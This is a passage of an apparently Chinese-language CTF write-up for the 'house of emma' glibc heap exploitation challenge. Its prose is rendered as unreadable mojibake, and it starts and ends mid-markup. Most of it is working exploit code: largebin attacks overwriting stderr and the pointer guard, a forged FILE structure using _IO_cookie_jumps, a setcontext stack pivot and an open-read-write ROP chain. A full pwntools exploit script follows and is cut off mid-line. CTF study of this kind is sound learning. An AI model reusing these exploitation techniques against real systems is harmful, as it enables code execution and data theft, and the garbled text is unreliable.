class="line">edit(<span class="number">2</span>,<span class="number">32</span>,payload)</span><br><span class="line">delet(<span class="number">7</span>)</span><br><span class="line">sendit()</span><br></pre></td></tr></table></figure><p>Â∞Ü5freeÊéâÔºåÊîæÂÖ•largebinÔºåÊâìÂá∫‰∏ÄÊ¨°attackÔºå‰øÆÊîπstderr</p><p>ÂèàÈÄöËøá7Â∞Ü5Áî≥ËØ∑ÂõûÊù•ÔºåÔºàËøôÈáåÁî≥ËØ∑‰πãÂâçÊ≤°Êúâ‰øÆÂ§çÔºåÂØºËá¥stderrÊåáÂêë‰∫Ü2Ôºâ</p><p>ÈöèÂêéÂÜçÊõ¥Êîπ2ÔºåÂÜçfreeÊéâ7Ôºà5ÔºâÔºåÊâìÂá∫Á¨¨‰∫åÊ¨°attackÔºå‰øÆÊîπpoint_guard</p><h3 id="pointer-chk-guard"><a href="#pointer-chk-guard" class="headerlink" title="__pointer_chk_guard"></a>__pointer_chk_guard</h3><p>ËØ•ÂÄºÂ≠òÂú®‰∫éfs:0x30</p><p>tlsÂü∫ÂùÄÊü•ÁúãÊñπÂºè‰∏∫<code>fsbase</code>Êàñ<code>tls</code>Ôºàpwngdb)ÔºåÂä†‰∏ä0x30Âç≥‰∏∫guardÂÄº</p><p>‰πüÂèØ‰ª•Áõ¥Êé•Áî®gdb</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(gdb) call arch_prctl(0x1003, $rsp - 0x8)    </span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">2 = 0</span> </span><br><span class="line">(gdb) x /gx $rsp - 0x8</span><br><span class="line">0x7fffffffe6e8: 0x00007ffff7fe0700   =&gt; IA32_FS_BASE</span><br></pre></td></tr></table></figure><p>Êú¨Âú∞gdbË∞ÉËØïÊó∂ËØ•ÂÄº‰∏élibcÂÅèÁßªÂèØËÉΩÊîπÂèòÔºåË∞ÉËØïÊó∂ÂèØ‰ª•ÂÖàÂÖ≥Èó≠aslr</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo sysctl -w kernel.randomize_va_space=0</span></span><br></pre></td></tr></table></figure><h3 id="‰øÆÂ§çlargebin‰∏éÂáÜÂ§áËß¶Âèë-malloc-assert"><a href="#‰øÆÂ§çlargebin‰∏éÂáÜÂ§áËß¶Âèë-malloc-assert" class="headerlink" title="‰øÆÂ§çlargebin‰∏éÂáÜÂ§áËß¶Âèë__malloc_assert"></a>‰øÆÂ§çlargebin‰∏éÂáÜÂ§áËß¶Âèë__malloc_assert</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#largbin fix</span></span><br><span class="line">payload = p64(heap_base+<span class="number">0x1120</span>)+p64(libc_base+<span class="number">0x1f30c0</span>)+p64(heap_base+<span class="number">0x1120</span>)*<span class="number">2</span></span><br><span class="line">edit(<span class="number">2</span>,<span class="number">32</span>,payload)</span><br><span class="line">payload = p64(libc_base+<span class="number">0x1f30c0</span>)+p64(heap_base+<span class="number">0x880</span>)*<span class="number">3</span></span><br><span class="line">edit(<span class="number">7</span>,<span class="number">32</span>,payload)</span><br><span class="line">sendit()</span><br><span class="line"><span class="comment">#prepare assert</span></span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x430</span>)</span><br><span class="line">delet(<span class="number">6</span>)</span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x440</span>)</span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x410</span>)</span><br><span class="line">edit(<span class="number">6</span>,<span class="number">0x420</span>,cyclic(<span class="number">0x418</span>)+p64(<span class="number">0x10</span>))</span><br><span class="line">sendit()</span><br></pre></td></tr></table></figure><p>ÂÖàÂàÜÂà´‰øÆË°•‰∏§‰∏™largebinÔºåÈò≤Ê≠¢ÂàÜÈÖçÊó∂ÂèëÁîüÈîôËØØ</p><p>Áî≥ËØ∑8Â°´Ë°•5,Áî≥ËØ∑9Â°´Ë°•2</p><p>Â∞ÜÊúÄÂ§ñÂ±ÇÁöÑchunk 6 freeÊéâÔºåÂä†ÂÖ•unsorted binÂπ∂‰∏étop chunkÂêàÂπ∂</p><p>ÂÜçÁî≥ËØ∑‰∏ÄÂùóÁï•Â∞è‰∫é6ÁöÑchunk 10ÔºåÈÄöËøá‰øÆÊîπchunk 6ÁöÑÂÜÖÂÆπ‰øÆÊîπtop chunkÁöÑsizeÊÆµ</p><p>Ê≠§Â§ÑÊîπ‰∏∫0x10‰Ωø‰πãÈ°µ‰∏çÂØπÈΩê</p><p>ÂêéÈù¢Âè™ÈúÄË¶ÅÁî≥ËØ∑‰∏Ä‰∏™chunkÂ∞±ÂèØ‰ª•Ëß¶Âèë<code>__malloc_assert</code></p><h2 id="ÊûÑÈÄ†IOÂà©Áî®Èìæ"><a href="#ÊûÑÈÄ†IOÂà©Áî®Èìæ" class="headerlink" title="ÊûÑÈÄ†IOÂà©Áî®Èìæ"></a>ÊûÑÈÄ†IOÂà©Áî®Èìæ</h2><h3 id="gadget"><a href="#gadget" class="headerlink" title="gadget"></a>gadget</h3><p>ÂÅáËÆæÊàë‰ª¨ÊéßÂà∂‰∫Ü<code>stderr</code>ÔºåËøõÂÖ•‰∫Ü<code>_IO_cookie_write</code>ÔºåË∞ÉÁî®ÂáΩÊï∞ÊåáÈíà<code>write_cb</code>ÔºåÊ≠§Êó∂Êàë‰ª¨Âè™ËÉΩÊéßÂà∂ËøõÂÖ•ÂáΩÊï∞Êó∂ÁöÑ<code>rdi</code>ÔºåËÄåÊéßÂà∂<code>setcontext</code>ÈúÄË¶ÅÊéßÂà∂rdx</p><p>Á¢∞Â∑ßÊúâ‰∏Ä‰∏™gadgetÔºåËÉΩÂ§üÂà©Áî®<code>rdi</code>ÊéßÂà∂<code>rdx</code>ÔºåËøòËÉΩcall‰∏Ä‰∏™Âíå<code>rdx</code>Áõ∏ÂÖ≥ÁöÑÂú∞ÂùÄ</p><p><img src="/../img/house-of-emma21%E6%B9%96%E6%B9%98%E6%9D%AF%E5%A4%8D%E7%8E%B0.assets/image-20230720211806875.png" alt="image-20230720211806875"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">gadget = libc_base + <span class="number">0x0000000000146020</span></span><br><span class="line"><span class="comment">#mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];</span></span><br><span class="line">ret = libc_base + <span class="number">0x000000000002d446</span></span><br><span class="line">pop_rax = libc_base + <span class="number">0x00000000000446c0</span></span><br><span class="line">pop_rdi = libc_base + <span class="number">0x000000000002daa2</span></span><br><span class="line">pop_rsi = libc_base + <span class="number">0x0000000000037c0a</span></span><br><span class="line">syscall = libc_base + <span class="number">0x00000000000883b6</span></span><br></pre></td></tr></table></figure><h3 id="fake-stderr"><a href="#fake-stderr" class="headerlink" title="fake stderr"></a>fake stderr</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">ROL</span>(<span class="params">content, n</span>):</span><br><span class="line">num = <span class="built_in">bin</span>(content)[<span class="number">2</span>:].rjust(<span class="number">64</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">int</span>(num[n:]+num[:n],<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#fake stderr</span></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">payload += p64(<span class="number">0xffffffffffffffff</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x78</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">payload += p64(libc_base + libc.sym[<span class="string">&#x27;_IO_stdfile_2_lock&#x27;</span>])</span><br><span class="line">payload = payload.ljust(<span class="number">0xc8</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">payload += p64(libc_base + libc.sym[<span class="string">&#x27;_IO_cookie_jumps&#x27;</span>]+<span class="number">0x40</span>)</span><br><span class="line">payload += p64(heap_base+<span class="number">0x10</span>) <span class="comment">#chunk 0-&gt;rdi</span></span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(ROL(gadget^(heap_base+<span class="number">0x1120</span>),<span class="number">0x11</span>))</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">0xe8</span>,payload)</span><br><span class="line">sendit()</span><br></pre></td></tr></table></figure><p>ËøõÂÖ•<code>__malloc_assert</code>ÂêéÔºåÂà©Áî®<code>__malloc_assert -&gt; __fxprintf -&gt; __vfxprintf -&gt; locked_vfxprintf -&gt; __vfprintf_internal -&gt; _IO_new_file_xsputn ( =&gt; _IO_cookie_write)</code>Ë∞ÉÁî®Èìæ</p><p>ÈúÄË¶ÅÊª°Ë∂≥<code>_IO_write_ptr &gt; _IO_write_base</code>Ôºå‰∏î<code>_lock</code>ÊåáÂêëÂèØÂÜôÂú∞ÂùÄÔºåÊ≠§Â§ÑÁõ¥Êé•‰ΩøÁî®ÂéüÂú∞ÂùÄ<code>_IO_stdfile_2_lock</code></p><p><code>vtable</code>ÈúÄË¶Å‰º™ÈÄ†ÔºåËß¶ÂèëIOÊó∂ÔºåÂéüÊú¨ÊåáÂêë<code>_IO_file_jumps -&gt; __xsputn</code>ÔºåÂç≥<code>&lt;__GI__IO_file_jumps+56&gt;</code>ÔºåÈúÄË¶Å‰º™ÈÄ†‰∏∫<code>_IO_cookie_jumps-&gt; __write</code>ÔºåÂç≥<code>&lt;_IO_cookie_jumps+120&gt;</code>ÔºåÊïÖÊ≠§Â§ÑÂ°´‰∏ä<code>_IO_cookie_jumps+0x40</code></p><p>ÊûÑÈÄ†<code>__cookie</code>‰∏∫chunk 0ÁöÑÂú∞ÂùÄÔºåÊ≥®ÊÑè‰∏∫‰∫ÜÊñπ‰æøÊõ¥ÊîπÔºåÂú∞ÂùÄÂä†‰∏ä0x10Ôºå‰πãÂêéchunk 0ÁöÑÁî®Êà∑Âú∞ÂùÄ‰ºöËøõÂÖ•<code>rdi</code></p><p>ÊûÑÈÄ†<code>cookie_write_function_t *write</code>Â§ÑÊåáÈíà‰∏∫gadgetÂú∞ÂùÄÔºåË∞ÉÁî®Êó∂Áõ¥Êé•ËøêË°ågadgetÔºåÊ≠§Â§ÑÊúâÂä†ÂØÜ</p><h3 id="rdi-rdx"><a href="#rdi-rdx" class="headerlink" title="rdi -&gt; rdx"></a>rdi -&gt; rdx</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#rdi-&gt;rdx</span></span><br><span class="line">payload = p64(<span class="number">0</span>)<span class="comment">#rdi</span></span><br><span class="line">payload += p64(heap_base + <span class="number">0x1120</span>+<span class="number">0x10</span>)<span class="comment">#rdx-&gt;chunk 5</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x10</span>,payload)</span><br><span class="line">sendit()</span><br></pre></td></tr></table></figure><p>‰øÆÊîπchunk 0Ôºå‰ΩørdxÊåáÂêëchunk5</p><h3 id="Â∏ÉÁΩÆrdxÈôÑËøëÊª°Ë∂≥setcontext"><a href="#Â∏ÉÁΩÆrdxÈôÑËøëÊª°Ë∂≥setcontext" class="headerlink" title="Â∏ÉÁΩÆrdxÈôÑËøëÊª°Ë∂≥setcontext"></a>Â∏ÉÁΩÆrdxÈôÑËøëÊª°Ë∂≥setcontext</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#rdx-&gt;setcontext</span></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + <span class="string">&quot;./flag\x00\x00&quot;</span></span><br><span class="line">payload += p64(setcontex61)<span class="comment">#call [rdx+0x20]</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x68</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">payload += p64(heap_base + <span class="number">0x1120</span>+<span class="number">0x10</span>+<span class="number">0x18</span>)<span class="comment">#rdi-&gt;./flag</span></span><br><span class="line">payload += p64(<span class="number">0</span>)<span class="comment">#rsi-&gt;0</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x88</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">payload += p64(<span class="number">0x100</span>)<span class="comment">#rdx-&gt;0</span></span><br><span class="line">payload = payload.ljust(<span class="number">0xa0</span>)</span><br><span class="line">payload += p64(heap_base+<span class="number">0x430</span>+<span class="number">0x10</span>)<span class="comment">#rsp-&gt;chunk 1</span></span><br><span class="line">payload += p64(ret)<span class="comment">#rcx-&gt;ret</span></span><br><span class="line">edit(<span class="number">5</span>,<span class="number">0xb0</span>,payload)</span><br><span class="line">sendit()</span><br></pre></td></tr></table></figure><p>Ê†πÊçÆsetcontext+61ÔºåÂ∏ÉÁΩÆ<code>rdx</code>Âë®Âõ¥Ôºå‰ΩøÂØÑÂ≠òÂô®Êª°Ë∂≥Êù°‰ª∂</p><p><code>rsp</code>ÊåáÂêëchunk 1Ôºå<code>rcx</code>ÊåáÂêëretÔºåÂ∞ÜÊ†àËøÅÁßªÂà∞chunk 1‰∏ä</p><h3 id="orw-chain"><a href="#orw-chain" class="headerlink" title="orw chain"></a>orw chain</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#orw chain</span></span><br><span class="line">payload = p64(pop_rax)</span><br><span class="line">payload += p64(<span class="number">2</span>)</span><br><span class="line">payload += p64(syscall)<span class="comment">#open</span></span><br><span class="line">payload += p64(pop_rax)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="number">3</span>)</span><br><span class="line">payload += p64(pop_rsi)</span><br><span class="line">payload += p64(heap_base + <span class="number">0x200</span>)</span><br><span class="line">payload += p64(syscall)<span class="comment">#read</span></span><br><span class="line">payload += p64(pop_rax)</span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(pop_rsi)</span><br><span class="line">payload += p64(heap_base + <span class="number">0x200</span>)</span><br><span class="line">payload += p64(syscall)<span class="comment">#write</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,<span class="number">17</span>*<span class="number">8</span>,payload)</span><br><span class="line">sendit()</span><br></pre></td></tr></table></figure><h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>, terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;new-window&#x27;</span>])</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">cmd=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">cmd += <span class="string">&quot;b *$rebase(0x1289)\nb *$rebase(0x1536)\nb *$rebase(0x15a4)\n *$rebase(0x13dd)\n&quot;</span></span><br><span class="line">gdb.attach(p, cmd)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">host = <span class="string">&quot;&quot;</span></span><br><span class="line">port = <span class="number">0</span></span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#pt = remote(host, port)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pl = <span class="string">&quot;&quot;</span></span><br><span class="line">tls_offset = <span class="number">0x3c0740</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index, size</span>):</span><br><span class="line"><span class="comment">#size(0x40f,0x500]</span></span><br><span class="line"><span class="keyword">global</span> pl</span><br><span class="line">pl += p8(<span class="number">1</span>)</span><br><span class="line">pl += p8(index)</span><br><span class="line">pl += p16(size)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delet</span>(<span class="params">index</span>):</span><br><span class="line"><span class="keyword">global</span> pl</span><br><span class="line">pl += p8(<span class="number">2</span>)</span><br><span class="line">pl += p8(index)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span><span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line"><span class="keyword">global</span> pl</span><br><span class="line">pl += p8(<span class="number">3</span>)</span><br><span class="line">pl += p8(index)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, size, <span class="built_in">str</span></span>):</span><br><span class="line"><span class="keyword">global</span> pl</span><br><span class="line">pl += p8(<span class="number">4</span>)</span><br><span class="line">pl += p8(index)</span><br><span class="line">pl += p16(size)</span><br><span class="line">pl += <span class="built_in">str</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sendit</span>():</span><br><span class="line"><span class="keyword">global</span> pl</span><br><span class="line">pl += p8(<span class="number">5</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;opcode\n&quot;</span>, pl)</span><br><span class="line">pl = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ROL</span>(<span class="params">content, n</span>):</span><br><span class="line">num = <span class="built_in">bin</span>(content)[<span class="number">2</span>:].rjust(<span class="number">64</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">int</span>(num[n:]+num[:n],<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x420</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x440</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x440</span>)<span class="comment">#largebins(9)-&gt;fakestderr(after attack pointerguard)</span></span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x440</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x430</span>)<span class="comment">#(7)(8)-&gt;pointer guard</span></span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x420</span>)</span><br><span class="line">delet(<span class="number">0</span>)</span><br><span class="line">delet(<span class="number">2</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">sendit()</span><br><span class="line"></span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))-<span class="number">0x1f2cc0</span></span><br><span class="line">stderr_addr = libc_base + libc.sym[<span class="string">&#x27;stderr&#x27;</span>]</span><br><span class="line">fixed_heap_fdbk = libc_base + <span class="number">0x1f30c0</span></span><br><span class="line">setcontex61 = libc_base + <span class="number">0x50bfd</span></span><br><span class="line">point_guard = libc_base + tls_offset + <span class="number">0x30</span></span><br><span class="line">log.success(<span class="string">&quot;libc_base = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc_base)))</span><br><span class="line">log.success(<span class="string">&quot;stderr = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(stderr_addr)))</span><br><span class="line">log.success(<span class="string">&quot;setcontex+61 = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(setcontex61)))</span><br><span class="line">log.success(<span class="string">&quot;point_guard = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(point_guard)))</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x410</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">16</span>,cyclic(<span class="number">16</span>))</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">sendit()</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;daaa&quot;</span>)</span><br><span class="line">heap_base = u64(p.recvn(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))-<span class="number">0x880</span></span><br><span class="line">log.success(<span class="string">&quot;heap0_base = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(heap_base)))</span><br><span class="line"></span><br><span class="line"><span class="comment">#attack stderr</span></span><br><span class="line">payload = p64(fixed_heap_fdbk)*<span class="number">2</span> + p64(heap_base+<span class="number">0x880</span>) + p64(stderr_addr-<span class="number">0x20</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">32</span>,payload)</span><br><span class="line">delet(<span class="number">5</span>)</span><br><span class="line">sendit()</span><br><span class="line"><span class="comment">#attack point_guart</span></span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x430</span>)</span><br><span class="line">payload = p64(fixed_heap_fdbk)*<span class="number">2</span> + p64(heap_base+<span class="number">0x880</span>) + p64(point_guard-<span class="number">0x20</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">32</span>,payload)</span><br><span class="line">delet(<span class="number">7</span>)</span><br><span class="line">sendit()</span><br><span class="line"><span class="comment">#largbin fix</span></span><br><span class="line">payload = p64(heap_base+<span class="number">0x1120</span>)+p64(libc_base+<span class="number">0x1f30c0</span>)+p64(heap_base+<span class="number">0x1120</span>)*<span class="number">2</span></span><br><span class="line">edit(<span class="number">2</span>,<span class="number">32</span>,payload)</span><br><span class="line">payload = p64(libc_base+<span class="number">0x1f30c0</span>)+p64(heap_base+<span class="number">0x880</span>)*<span class="number">3</span></span><br><span class="line">edit(<span class="number">7</span>,<span class="number">32</span>,payload)</span><br><span class="line">sendit()</span><br><span class="line"><span class="comment">#prepare assert</span></span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x430</span>)</span><br><span class="line">delet(<span class="number">6</span>)</span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x440</span>)</span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x410</span>)</span><br><span class="line">edit(<span class="number">6</span>,<span class="number">0x420</span>,cyclic(<span class="number">0x418</span>)+p64(<span class="number">0x10</span>))</span><br><span class="line">sendit()</span><br><span class="line"></span><br><span class="line">gadget = libc_base + <span class="number">0x0000000000146020</span></span><br><span class="line"><span class="comment">#mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];</span></span><br><span class="line">ret = libc_base + <span class="number">0x000000000002d446</span></span><br><span class="line">pop_rax = libc_base + <span class="number">0x00000000000446c0</span></span><br><span class="line">pop_rdi = libc_base + <span class="number">0x000000000002daa2</span></span><br><span class="line">pop_rsi = libc_base + <span class="number">0x0000000000037c0a</span></span><br><span class="line">syscall = libc_base + <span class="number">0x00000000000883b6</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#fake stderr</span></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">payload += p64(<span class="number">0xffffffffffffffff</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x78</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">payload += p64(libc_base + libc.sym[<span class="string">&#x27;_IO_stdfile_2_lock&#x27;</span>])</span><br><span class="line">payload = payload.ljust(<span class="number">0xc8</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">payload += p64(libc_base + libc.sym[<span class="string">&#x27;_IO_cookie_jumps&#x27;</span>]+<span class="number">0x40</span>)</span><br><span class="line">payload += p64(heap_base+<span class="number">0x10</span>) <span class="comment">#chunk 0-&gt;rdi</span></span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(ROL(gadget^(heap_base+<span class="number">0x1120</span>),<span class="number">0x11</span>))</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">0xe8</span>,payload)</span><br><span class="line">sendit()</span><br><span class="line"><span class="comment">#rdi-&gt;rdx</span></span><br><span class="line">payload = p64(<span class="number">0</span>)<span class="comment">#rdi</span></span><br><span class="line">payload += p64(heap_base + <span class="number">0x1120</span>+<span class="number">0x10</span>)<span 